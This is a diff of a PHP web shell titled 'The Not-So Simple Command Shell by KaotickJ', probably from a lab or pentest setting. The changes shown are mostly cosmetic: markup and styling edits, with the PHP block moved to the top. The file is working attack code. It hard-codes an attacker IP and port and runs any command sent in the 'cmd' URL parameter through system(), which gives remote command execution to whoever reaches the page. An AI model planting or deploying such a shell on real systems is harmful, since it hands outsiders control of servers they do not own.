@@ -1,13 +1,15 @@
-<!doctype html>
+<?php
+$attackip = "10.0.2.6";
+$attackport = "8000";
+echo '<!doctype html>
 <html lang="en">
 <head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
 <title>The Not-So Simple Command Shell by KaotickJ</title>
 </head>
 <body>
-<?php 
-$attackip = "10.0.2.6";
-$attackport = "8000";
-echo '<div style="border:1px solid #333;width:50%;padding:0px 30px;border-radius:10px;margin:10px 40px;">
+<div style="border:1px solid #333;width:50%;padding:0px 30px;border-radius:10px;margin:10px 40px;">
 <h4 style="">The Not So Simple Command Shell</h4>
 <form action="" method="get">Command? <input type="text" name="cmd" autofocus/>
 <button type="submit">Execute</button></form>
@@ -68,7 +70,7 @@ if (isset($_GET['upload'])) {
 }
 
 if (isset($_GET['cmd'])) {
-	echo '<pre style="margin:20px 40px;color:#fff;background-color:#000;padding:10px 20px;">';
+	echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
 	echo (system($_GET['cmd']));
 	echo '</pre>';
 }
